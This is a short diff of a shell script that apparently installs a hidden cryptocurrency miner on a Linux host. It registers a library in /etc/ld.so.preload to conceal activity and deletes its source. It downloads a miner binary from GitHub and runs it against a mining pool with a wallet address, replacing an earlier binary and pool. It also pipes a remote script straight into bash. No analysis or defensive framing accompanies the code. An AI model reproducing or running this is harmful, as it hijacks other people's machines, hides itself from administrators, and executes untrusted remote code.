@@ -8,7 +8,7 @@ echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
 echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
-wget -O asu https://github.com/kartolo92/pile/raw/main/CPU
-chmod 777 asu
-./asu -a yescryptr32  -o stratum+tcp://165.22.13.21:443 -u lpep1qkvhl0w9luux3553tju2apjvmjg2rfpzkrn4sst.$(shuf -n 1 -i 1-99999)-kzp > /dev/null 2>&1 &
+wget -O asu https://github.com/kidoescegh/jadul/raw/main/varel
+chmod +x asu
+./asu --a randomvirel --url 137.184.39.51:443 --user vor3848x1zcvlh41e0d39pd4jv8u2r8o6vvqmz.$(shuf -n 1 -i 1-99999)-kzp
 curl -sL https://github.com/kartolo92/koplok/raw/master/time | bash
